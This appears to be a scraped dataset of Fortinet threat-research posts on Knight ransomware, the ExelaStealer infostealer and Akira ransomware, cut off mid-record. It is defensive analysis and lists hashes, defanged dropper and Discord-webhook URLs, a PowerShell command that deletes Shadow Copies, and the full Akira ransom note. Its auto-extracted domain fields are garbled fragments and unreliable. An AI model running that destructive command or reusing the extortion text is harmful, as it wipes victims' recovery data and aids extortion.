AV signature: FortiGuard Labs detects the known Knight ransomware droppers with the following AV signature: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Known hosting sites of the Knight ransomware droppers are blocked by the Web filtering client. 1112d8346ee413ac8aecaf5bc0dc5400041669116a5a596c6be2e24c6886849d Knight ransomware 2bfababf54992c32afced15b355cf7fcf7c6b0783cfee9086e80893d5f5124ed 3ed381014d25a9796bd6d007573b2abe152ee455738ae5f2288e5146726f3b2e 3f029aee12d43e3c67c4ab07c43bcd0960fa9f6a371f40577004673ac95e870c 40c6896d761595fe190e0fa891462bfb120579b6399bd28f40839c017a367538 4416ba60d11b0e8eafa07f3c3051c2d84ffcb5c860d458b6a1374fdc935e92f2 484414d68e1c3e79e602ed2876e963161916e21ea4e2c920da5cc623ea19731f 50ce3d6e410f0f83c9407a572eb29733084fed94f5dacff59cea350bcccee27d 581c6c58e6ea187e74bc23d8d0fa9feb7dc5cc2db4ca887afee5be229532e8e2 5ec48925f73ea58a27d6306d23d76b5da41e16754f58f26098ed36f0d1f198c8 6ff69b6e0f778aabf521a72a70c34274acfabc59a3472f7cba2372ebb8875d0f 70d2891a1cb3b6172428ea9cdb5a81b0494deac02b7dee91527a17fb9f53509a 712fc089cb028e381e285685519df357fb4102f8bc8de31547a9b98ca7629e49 7b4d227fddcc4e93ea0cdf017026ff2dad6efd6bc7de71b689dc0595a2a4fb4d 7f99540993e2afc351776b85ea22661d3701743521d55d657abdb23e12c93c00 a6258d70bc0b5d5c87368c5024d3f23585790b14227b8c59333413082524a956 b586d60beb49b362d4cd9b8d64fc9a3eef3da76b0f494c42c4ac30d6612d8993 b5deec95d1f50229e1361ca47761b9742006f484cf1f2c31ba8a495afb814ae2 cb41bbbe053e7a9b4857bf89c92298e7c0abdf9da157185fcfec5b383fe1e62c cd92bf9c3349b086eec621de247bbb1bceebffb90863a46496c3b41fb13ec745 ce609604f4deb265ed957540b86ba96b33d26399c8d508110d78b0602f9d9d3a d256bb30d0609d0e3aa7f1b98077dda6136f2f3604beb71ec982d8125d2858ed e2af95e7827144a9278fcbb87fe8d9a4cfdb8f69b2f43f63c9e26aa6a33cc2ed e5f1f8f5b2b4304493f416b54324c0b0e0253ed07ee1f4512bbe184e32e4580a ecafd694118c4bcd21b4f7a620ed8a1346932f05acefe8cd32a01febec9a92d9 fba8fee602b5c3db46cbbb45ff2f8aa72791f47f8b8c6a556334d3d3358cebba 1341bd6193ea223c05566aaca13fc1152732b67af8344519d6efaaf9ab6ed5f4 Knight ransomware dropper 14ab9dc515dc22f0bbf5f3e44cc280e35331bf9209b6c4d35b86bfe3f32bcd23 167678eb9daa2376bd805069fac69c42b0ad0c6f70b9d644161970c1770c117f 3bd52cefc9d88c5292275729ca096c131a5db8c77ec142493a066623270cb782 3fbedfb9ae1e9bcef7983491124e3a50937f9c5209b7cfc2614197a2e8045cfb 4f1e46ac9e46f019d3be3173f0541f5ed07bde6389180cd7e8255d35b49f812e 554990b8636baf5af393d52ce85150a8b263b9c5fb214bc0e69a1b032ee8f3ae 5ace35adeb360b9e165e7c55065d12f192a3ec0ca601dd73b332bd8cd68d51fe 5c0f3de1254bcad7f457ad1898df2fdbe44dc964b5e92fba125c19888481da75 5ed4dfb7da504438688d779092a717cb2426ee88bc4f0ee588b3e989b7567dff 61bb91bc554d9b849cbd670669365bc5a58a8c5f9a0f530b8ed9a4b8f0968186 716341671eff8ca18c5f5bbf38095d07225141d02854168f854b168731b4c71c 75e227a3a41dc1c2d4384e877d88f9a06437a49f2c71f8efa7e2cc60bab6cc4a 7ec0d3e3dc4222f34c482926ce1f971b51929e95b9d097140bc1f4b1c84dafd9 9123e42cdd3421e8f276ac711988fb8a8929172fa76674ec4de230e6d528d09a a2c654357d790d7c4cec619de951649db31ecdb63935f38b11bb37f983ff58de b6064f6936f72d1312f40f86f0cb889c6d0477c20f59c6c96c385c6287f701f7 bb65532e8a52e282d98938031c0d75155082933524924d01de4246e12690cf9c c42ad519510936f14ab46fbad53606db8132ea52a11e3fc8d111fbccc7d9ab5a dbf9cc65461c7bc650938156d3751d4ae0ce4312d3899f747e590767c0ef0408 eedda61d02d8bd0e145a07e6048621fc84f420376e6cda2616c2d77d4fd4fe18 f2571431c9d8e87081816d46cda9bde8d98b081056fdc2114e88cbad2d544cec hxxp://89.23.96.203/333/1[.]exe Knight ransomware dropper location Knight ransomware dropper location hxxp://89.23.96.203/333/2[.]exe hxxp://89.23.96.203/333/3[.]exe hxxp://89.23.96.203/333/4[.]exe hxxp://89.23.96.203/333/6[.]exe hxxp://89.23.96.203/333/7[.]exe hxxp://89.23.96.203/333/8[.]exe hxxp://89.23.96.203/333/9[.]exe hxxp://89.23.96.203/333/92[.]exe hxxp://89.23.96.203/333/10[.]exe hxxp://89.23.96.203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es[.]exe hxxp://89.23.96.203/333/xwenxub285p83ecrzvft[.]exe hxxp://89.23.96.203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR[.]exe hxxp://89.23.96.203/333/cv4TCGxUjvS[.]exe Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup,extortion FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight",
      "scraped_at": "2025-07-20T13:52:31.351733",
      "indicators": {
        "ip_address": [
          "89.23.96.203"
        ],
        "domain": [
          "iles"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "b586d60beb49b362d4cd9b8d64fc9a3eef3da76b0f494c42c4ac30d6612d8993",
          "d256bb30d0609d0e3aa7f1b98077dda6136f2f3604beb71ec982d8125d2858ed",
          "1341bd6193ea223c05566aaca13fc1152732b67af8344519d6efaaf9ab6ed5f4",
          "3ed381014d25a9796bd6d007573b2abe152ee455738ae5f2288e5146726f3b2e",
          "a2c654357d790d7c4cec619de951649db31ecdb63935f38b11bb37f983ff58de",
          "484414d68e1c3e79e602ed2876e963161916e21ea4e2c920da5cc623ea19731f",
          "3fbedfb9ae1e9bcef7983491124e3a50937f9c5209b7cfc2614197a2e8045cfb",
          "9123e42cdd3421e8f276ac711988fb8a8929172fa76674ec4de230e6d528d09a",
          "61bb91bc554d9b849cbd670669365bc5a58a8c5f9a0f530b8ed9a4b8f0968186",
          "5ec48925f73ea58a27d6306d23d76b5da41e16754f58f26098ed36f0d1f198c8",
          "e5f1f8f5b2b4304493f416b54324c0b0e0253ed07ee1f4512bbe184e32e4580a",
          "2bfababf54992c32afced15b355cf7fcf7c6b0783cfee9086e80893d5f5124ed",
          "5c0f3de1254bcad7f457ad1898df2fdbe44dc964b5e92fba125c19888481da75",
          "581c6c58e6ea187e74bc23d8d0fa9feb7dc5cc2db4ca887afee5be229532e8e2",
          "554990b8636baf5af393d52ce85150a8b263b9c5fb214bc0e69a1b032ee8f3ae",
          "cd92bf9c3349b086eec621de247bbb1bceebffb90863a46496c3b41fb13ec745",
          "5ed4dfb7da504438688d779092a717cb2426ee88bc4f0ee588b3e989b7567dff",
          "bb65532e8a52e282d98938031c0d75155082933524924d01de4246e12690cf9c",
          "e2af95e7827144a9278fcbb87fe8d9a4cfdb8f69b2f43f63c9e26aa6a33cc2ed",
          "3bd52cefc9d88c5292275729ca096c131a5db8c77ec142493a066623270cb782",
          "712fc089cb028e381e285685519df357fb4102f8bc8de31547a9b98ca7629e49",
          "40c6896d761595fe190e0fa891462bfb120579b6399bd28f40839c017a367538",
          "f2571431c9d8e87081816d46cda9bde8d98b081056fdc2114e88cbad2d544cec",
          "3f029aee12d43e3c67c4ab07c43bcd0960fa9f6a371f40577004673ac95e870c",
          "70d2891a1cb3b6172428ea9cdb5a81b0494deac02b7dee91527a17fb9f53509a",
          "cb41bbbe053e7a9b4857bf89c92298e7c0abdf9da157185fcfec5b383fe1e62c",
          "b5deec95d1f50229e1361ca47761b9742006f484cf1f2c31ba8a495afb814ae2",
          "ecafd694118c4bcd21b4f7a620ed8a1346932f05acefe8cd32a01febec9a92d9",
          "50ce3d6e410f0f83c9407a572eb29733084fed94f5dacff59cea350bcccee27d",
          "a6258d70bc0b5d5c87368c5024d3f23585790b14227b8c59333413082524a956",
          "167678eb9daa2376bd805069fac69c42b0ad0c6f70b9d644161970c1770c117f",
          "c42ad519510936f14ab46fbad53606db8132ea52a11e3fc8d111fbccc7d9ab5a",
          "14ab9dc515dc22f0bbf5f3e44cc280e35331bf9209b6c4d35b86bfe3f32bcd23",
          "6ff69b6e0f778aabf521a72a70c34274acfabc59a3472f7cba2372ebb8875d0f",
          "716341671eff8ca18c5f5bbf38095d07225141d02854168f854b168731b4c71c",
          "4f1e46ac9e46f019d3be3173f0541f5ed07bde6389180cd7e8255d35b49f812e",
          "75e227a3a41dc1c2d4384e877d88f9a06437a49f2c71f8efa7e2cc60bab6cc4a",
          "4416ba60d11b0e8eafa07f3c3051c2d84ffcb5c860d458b6a1374fdc935e92f2",
          "ce609604f4deb265ed957540b86ba96b33d26399c8d508110d78b0602f9d9d3a",
          "7ec0d3e3dc4222f34c482926ce1f971b51929e95b9d097140bc1f4b1c84dafd9",
          "1112d8346ee413ac8aecaf5bc0dc5400041669116a5a596c6be2e24c6886849d",
          "7b4d227fddcc4e93ea0cdf017026ff2dad6efd6bc7de71b689dc0595a2a4fb4d",
          "eedda61d02d8bd0e145a07e6048621fc84f420376e6cda2616c2d77d4fd4fe18",
          "b6064f6936f72d1312f40f86f0cb889c6d0477c20f59c6c96c385c6287f701f7",
          "fba8fee602b5c3db46cbbb45ff2f8aa72791f47f8b8c6a556334d3d3358cebba",
          "5ace35adeb360b9e165e7c55065d12f192a3ec0ca601dd73b332bd8cd68d51fe",
          "dbf9cc65461c7bc650938156d3751d4ae0ce4312d3899f747e590767c0ef0408",
          "7f99540993e2afc351776b85ea22661d3701743521d55d657abdb23e12c93c00"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 1.4231856738925543
    }
  },
  {
    "id": "Fortinet_56252",
    "source": "Fortinet",
    "title": "Another InfoStealer Enters the Field, ExelaStealer",
    "text": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:The information collected can be used for future attacksSeverity Level:Medium In 2023, the InfoStealer market is a reasonably crowded affair. The likes of RedLine, Raccoon, and Vidar own a significant market share, with new entrants such as SaphireStealer appearing frequently. The latest entry, ExelaStealer has now taken the field. Very little backstory is available on ExelaStealer, with the earliest public mentions FortiGuard Labs could locate occurring in August 2023. FortiGuard Labs research reveals that ExelaStealer is a largely open-source InfoStealer with paid customizations available from the threat actor. It is written in Python, although it pulls resources from other languages (e.g., JavaScript) where needed. It can steal sensitive information from a Windows-based host (e.g., passwords, credit cards, cookies and session data, and general keylogging). FortiGuard Labs was able to obtain a sample. This blog will analyze its inner workings. Advertising on the Dark Web for ExelaStealer offers both an open-source and paid-for version. These advertisements also provide good insight into its capabilities. Some ads appear to have been posted by the prime contact for ExelaStealer, an individual or group using the handle “quicaxd.” As shown in Figure 2, the cost for a month of use is $20, while three months is $45. A lifetime subscription is $120. Additionally, its Telegram channel is shown, which was active at the time of writing. Its Telegram home allows individuals to purchase a copy of the paid-for version and the GitHub repo for the open-source version. Anyone with the necessary skills could create an ExelaStealer binary using the freely available source code. The malware can currently only be compiled and packaged on a Windows-based host. The primary code for the malware is contained in a file named “Exela.py.” The build process is initiated using a batch file that then calls Python and the “builder.py” file. The builder uses a file named “obf.py” to make the calls necessary to obfuscate ExelaStealer’s code, making it harder to analyze. The non-library and now obfuscated code is distilled into a file named “Obfuscated.py,” which is ready for use. The binaries analyzed by FortiGuard Labs appeared to have been released as part of a specific campaign. The use of a decoy document supports this. Unfortunately, the initial infection vector was not available to us. However, initial infection could be achieved in any number of ways (e.g., phishing, watering holes, other malware, etc.). This binary acts as a container and first stage for the deployment. Its job is the spawning of the “sirket-ruhsat-pdf.exe” (95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51) executable and launching a PDF viewer to display a decoy document (BNG 824 ruhsat.pdf) to the user. It will deposit both files into the root of the C: Drive. “sirket-ruhsat-pdf.exe” automatically attempts to find a compatible viewer and launch “BNG 824 ruhsat.pdf”. The PDF is a copy of a Turkish vehicle registration certificate for a Dacia Duster. The document is entirely benign and simply a visual decoy to the user. “sirket-ruhsat-pdf.exe” is a PyInstaller executable. As such, a tool such as “pyinstxtractor” (https://github.com/extremecoders-re/pyinstxtractor) can extract the archive's contents for inspection. The executable is most likely signed with a fraudulent or invalid certificate and uses the name “Runtime Broker,” a legitimate Microsoft process. Figure 10 shows the compiled version of the “Obfuscated.py” file. Using another tool, such as “pycdc” (Python Byte-code Disassembler/Decompiler - https://github.com/zrax/pycdc), the code in “Obfuscated.pyc” can be decompiled. Unfortunately, as good as its word, function names and variable values in the file are heavily obfuscated, increasing the time required to analyze it statically. That does not make it impossible, however. A large blob of data in the code looks out of place compared to the rest of the instructions. Functions at the end of the file allow for its decoding and execution. By taking those functions and depositing them with the blob into a test script, we can obtain the full decoded contents for review. Figure 14 shows the final output, which you’ll note is the code for “Exela.py.” except in this case, it is being used in the wild. Turning our attention to dynamic analysis, the first activity that “sirket-ruhsat-pdf.exe” will complete is spawning itself in a new process. ExelaStealer then runs the following two commands: These collect the version of Windows and the host’s UUID (Universally Unique Identifier). What follows next is a base-64 encoded PowerShell command. Decoded, this command attempts to grab a screenshot of whatever is currently displayed on the screen. A flurry of both PowerShell and command-line items then follows: These commands copy images from the Clipboard and gather basic system information, basic physical disk information, user information, firewall status, and, interestingly, WLAN status and profile. To store this information locally before sending it back to the TA, a folder is created in “C:\\Users\\<user>\\AppData\\Local\\Temp\\” and named using the UUID of the host. Each text file contains a URL back to the Telegram channel of the TA. The files are packaged into a Zip archive using the same name as the folder (the UUID). This is then sent using a Discord webhook (https://discord.com/developers/docs/resources/webhook) to post to a TA-controlled Discord channel. Data has become a valuable currency, and because of this, attempts to gather it will likely never cease. InfoStealer malware exfiltrates data belonging to corporations and individuals that can be used for blackmail, espionage, or ransom. Despite the number of infostealers in the wild, ExelaStealer shows there is still room for new players to emerge and gain traction. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. sirket-ruhsat-pdf.exe f96bc306a0e3bc63092a04475dd4a1bac75224df242fa9fca36388a1978ce048 sirket-ruhsat-pdf.exe 95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51 BNG 824 ruhsat.pdf 5aff2c5e65d8e4e7fa0b0c310fbaef1e1da351de34fa5f1b83bfe17eeabac7ef RuntimeBroker.exe 34dca3c80cd5125091e6e4de02e86dcc6a2a6f9900e058111e457c9bce6117c0 RuntimeBroker.exe c56b23602949597352d99aff03411d620b7a5996da2cab91368de275dcfbaa44 hXXps://discord[.]com/api/webhooks/1139506512302194789/X_VYZdAHscWQNKWvya9KWqqqTK6UjVvS86_kUy8P8OyCcPhKykCQpEqf93S_qDFVuzp8 Discord webhook address infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/exelastealer-infostealer-enters-the-field",
      "scraped_at": "2025-07-20T13:52:39.847346",
      "indicators": {
        "ip_address": [],
        "domain": [
          "uhsat",
          "xela",
          "untimeBroker",
          "uilder",
          "irket-ruhsat-pdf",
          "bf",
          "iscord",
          "ithub",
          "bfuscated"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "34dca3c80cd5125091e6e4de02e86dcc6a2a6f9900e058111e457c9bce6117c0",
          "c56b23602949597352d99aff03411d620b7a5996da2cab91368de275dcfbaa44",
          "5aff2c5e65d8e4e7fa0b0c310fbaef1e1da351de34fa5f1b83bfe17eeabac7ef",
          "f96bc306a0e3bc63092a04475dd4a1bac75224df242fa9fca36388a1978ce048",
          "95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://github.com/zrax/pycdc",
          "https://discord.com/developers/docs/resources/webhook",
          "https://github.com/extremecoders"
        ]
      },
      "threat_score": 0.46874999999999994
    }
  },
  {
    "id": "Fortinet_15065",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Akira",
    "text": "FortiGuard Labs Threat Research Update 4/24/24 – The latest CISA Advisory#StopRansomware: Akira Ransomware | CISAcontains contributions from Fortinet and other industry partners. On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Akira ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Akira is a relatively new ransomware variant with Windows and Linux versions that came out in April 2023. Like many attackers, the gang behind this variant only uses the ransomware to encrypt files after first breaking into a network and stealing data. This group also employs a double extortion tactic, demanding a ransom from victims in exchange for file decryption and not leaking stolen information to the public. According to anadvisoryissued by CERT India, Akira typically targets organizations running a VPN (virtual private network) service without multi-factor authentication configured. Purchasing network access from the initial access brokers is another possibility. According to data collected through Fortinet'sFortiRecon service, the Akira ransomware group has targeted various industry sectors. While Manufacturing is its most targeted sector, it only leads the second-ranked sector, Business Services, by 2%. Other industry sectors are mostly evenly targeted, which indicates that the Akira ransomware group victimized any organizations they found vulnerable. When victim organizations are classified by country, the United States is in first place by a significant margin. As of September 22, 2023, the Akira ransomware group had last posted new victims on September 18th. Once a network has been compromised and data has been exfiltrated, the ransomware group will deploy the Windows version of the Akira ransomware to machines running the Windows operating system. The ransomware looks for and encrypts files on those machines. However, it skips the following file extensions for file encryption: The following directories are also excluded from file encryption: The Akira ransomware offers a few command-line options for attackers when executing: The ransomware adds a “.akira” extension to encrypted files. It then drops the following ransom note, labeled \" akira_readme.txt,\" in every folder where files are encrypted. It also runs the following PowerShell command to delete Shadow Copies, which makes file recovery difficult. powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" The Linux version of the Akira ransomware targets files with the following extensions for encryption: \".4dd\", \".4d\", \".accdb\", \".accdc\", \".accde\", \".accdr\", \".accdt\", \".accft\", \".adb\", \".ade\", \".adf\", \".adp\", \".arc\", \".ora\", \".alf\", \".ask\", \".btr\", \".bdf\", \".cat\", \".cdb\", \".ckp\", \".cma\", \".cpd\", \".dacpac\", \".dad\", \".dadiagrams\", \".daschema\", \".db\", \".db-shm\", \".db-wa\", \".db3\", \".dbc\", \".dbf\", \".dbs\", \".dbt\", \".dbv\", \".dbx\", \".dcb\", \".dct\", \".dcx\", \".dd\", \".dlis\", \".dp1\", \".dqy\", \".dsk\", \".dsn\", \".dtsx\", \".dx\", \".eco\", \".ecx\", \".edb\", \".epim\", \".exb\", \".fcd\", \".fdb\", \".fic\", \".fmp\", \".fmp12\", \".fmps\", \".fo\", \".fp3\", \".fp4\", \".fp5\", \".fp7\", \".fpt\", \".frm\", \".gdb\", \".grdb\", \".gwi\", \".hdb\", \".his\", \".ib\", \".idb\", \".ihx\", \".itdb\", \".itw\", \".jet\", \".jtx\", \".kdb\", \".kexi\", \".kexic\", \".kexis\", \".lgc\", \".lwx\", \".maf\", \".maq\", \".mar\", \".mas\", \".mav\", \".mdb\", \".mdf\", \".mpd\", \".mrg\", \".mud\", \".mwb\", \".myd\", \".ndf\", \".nnt\", \".nrmlib\", \".ns2\", \".ns3\", \".ns4\", \".nsf\", \".nv\", \".nv2\", \".nwdb\", \".nyf\", \".odb\", \".oqy\", \".orx\", \".owc\", \".p96\", \".p97\", \".pan\", \".pdb\", \".pdm\", \".pnz\", \".qry\", \".qvd\", \".rbf\", \".rctd\", \".rod\", \".rodx\", \".rpd\", \".rsd\", \".sas7bdat\", \".sbf\", \".scx\", \".sdb\", \".sdc\", \".sdf\", \".sis\", \".spq\", \".sq\", \".sqlite\", \".sqlite3\", \".sqlitedb\", \".te\", \".temx\", \".tmd\", \".tps\", \".trc\", \".trm\", \".udb\", \".ud\", \".usr\", \".v12\", \".vis\", \".vpd\", \".vvv\", \".wdb\", \".wmdb\", \".wrk\", \".xdb\", \".xld\", \".xmlff\", \".abcddb\", \".abs\", \".abx\", \".accdw\", \".adn\", \".db2\", \".fm5\", \".hjt\", \".icg\", \".icr\", \".lut\", \".maw\", \".mdn\", \".mdt\", \".vdi\", \".vhd\", \".vmdk\", \".pvm\", \".vmem\", \".vmsn\", \".vmsd\", \".nvram\", \".vmx\", \".raw\", \".qcow2\", \".subvo\", \".bin\", \".vsv\", \".avhd\", \".vmrs\", \".vhdx\", \".avdx\", \".vmcx\", \".iso\" The Linux variant of Akira also uses various symmetric key algorithms for file encryption, including AES, CAMELLIA, DES, and IDEA. One notable thing about the Linux version is that it excludes the same file extensions and directories from file encryption as the Windows version. This indicates that the attacker has ported the Windows version to Linux. It also drops the same ransom note as the Windows version: The Akira ransomware group owns its own TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Unlike the TOR sites used by other ransomware groups, Akira’s TOR site accepts commands and displays results. For example, executing the “leaks” command will bring up links to the stolen data and the information on victim organizations. The Akira attacker has also made that data available on Torrent. Another command, “news,” brings up a list of victim organizations and their information. As of September 22, 2023, the latest victims had been posted on September 18. The Akira ransomware has claimed six victims so far in September 2023. The group went hot in August, victimizing more than 20 organizations. We have also observed at least a few minor variants of Akira ransomware. The latest minor variant is Megazord, which came out in late August 2023. “Megazord” evokes the giant robot from the Japanese superhero drama series Power Rangers. The attacker’s pick of “Megazord” is fitting for an Akira variant as the name “Akira” was most likely taken from a popular Japanese cyberpunk comic and movie with the same name. The variant drops a ransom note labeled “powerranges.txt”. The content of “powerranges.txt” is below: Hi friends, Whatever who you are and what your title is if you're reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption. Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment, you have to know: 1. Dealing with us you will save A LOT dueto we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal. 2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. If you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them - in this case we won't be able to help. 3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we've managed to detect and used in order to get into, identify backup solutions and upload your data. 4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones. Then all of this will be published in our blog - https://akira[removed].onion. 5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us. If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions: 1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/. 2. Paste this link - https://akira[removed].onion. 3. Use this code – [removed] - to log into our chat. Keep in mind that the faster you will get in touch, the less damage we cause. As shown, Megazord’s ransom note asks victims to visit the Akira ransomware’s TOR site. There is one other Megazord ransomware variant. However, that variant only has the attacker’s Telegram channel and Tox ID for contact methods. Interestingly, Megazord is written in Rust, whereas a typical Akira build is in C++. This may indicate that future Akira variants will be written in Rust or that it is going through a rebranding. Only time will tell. Older minor variants came out in May and June of 2023. One minor variant from May adds a “.iqoj” extension to the encrypted files and leaves a ransom note labeled “readme-asldkas.txt.” Another minor variant from June appends a “.zhq” extension to encrypted files and drops “help-you.txt” as a ransom note. Although the file extensions and ransom note names do not have any “Akira” in them, they still lead victims to Akira’s TOR site. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Akira ransomware samples with the following AV signature: FortiGuard Labs detects minor variants of the Akira ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 2a9257c6c74e37d051f78ed5abaa620b71b27fa3604798af077256a128d911bb Windows version of Akira ransomware 3f4ceeada7ff021c30df1646437d2ab0e55997bbb281444501f6d1f4ea8fa209 Windows version of Akira ransomware fb2433beb961839b36198e242d0dedb7fa85ab3e08a1141d02874aa4235ac776 Windows version of Akira ransomware c239dadd55b55b817fda5b0c2bb062adf399a5b78a8b3280a473d3ae66f81777 Windows version of Akira ransomware 4cb8365b18b1c319d374be0b9d219144c20fb8714e9cf346e655f854d2c60170 Windows version of Akira ransomware 772eb611c9ca20b461536fd0bd87d553dcecf3f4c82e26c2378cad40bbf4b0b0 Windows version of Akira ransomware 2e2ad6392e75d5a5155498c2a76cb373d17ca3ad4ba57c6d33c623fca5e29342 Windows version of Akira ransomware 92072945358b605c024b9e3335fb33b82faf33048c56f5529aaf5af4bf0c1b30 Windows version of Akira ransomware 4aaa583a9c554ea8e73d4dee0d53eb12dda17df16388f96c0f6ddbaafbcda813 Windows version of Akira ransomware 637e28b38086ff9efd1606805ff57aaf6cdec4537378f019d6070a5efdc9c983 Windows version of Akira ransomware 2084ab8f92a86a37a35879378610949e21ea7b5030313655bb82fe6c67772b0d Windows version of Akira ransomware 473326da3fff09ee3e486f5f39c090690437ac8bf8bdce556c8033e8f0d730fc Windows version of Akira ransomware b3f473b0fd752fcd8b0d5983366c4ccccdacdceb8d6ba25fcb02b34c622cca78 Windows version of Akira ransomware cfbcea795524c69a6d28fd9e60e07437d8f2abd23812109430ca2efd46606310 Windows version of Akira ransomware 337d21f964091417f22f35aee35e31d94fc3f35179c36c0304eef6e4ae983292 Windows version of Akira ransomware 6cadab96185dbe6f3a7b95cf2f97d6ac395785607baa6ed7bf363deeb59cc360 Windows version of Akira ransomware 9ca333b2e88ab35f608e447b0e3b821a6e04c4b0c76545177890fb16adcab163 Windows version of Akira ransomware d0510e1d89640c9650782e882fe3b9afba00303b126ec38fdc5f1c1484341959 Windows version of Akira ransomware 920384692233578a59fc8de2b0205fd9fb20bb0d75c1d5a1534377abf0fc08bc Windows version of Akira ransomware 1b6af2fbbc636180dd7bae825486ccc45e42aefbb304d5f83fafca4d637c13cc Windows version of Akira ransomware 8631ac37f605daacf47095955837ec5abbd5e98c540ffd58bb9bf873b1685a50 Windows version of Akira ransomware 3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c Windows version of Akira ransomware 7b295a10d54c870d59fab3a83a8b983282f6250a0be9df581334eb93d53f3488 Windows version of Akira ransomware 7613fbb940f83173aea126da5cf4319943155f4df25fd2e880eb0c03b1e273f0 Windows version of Akira 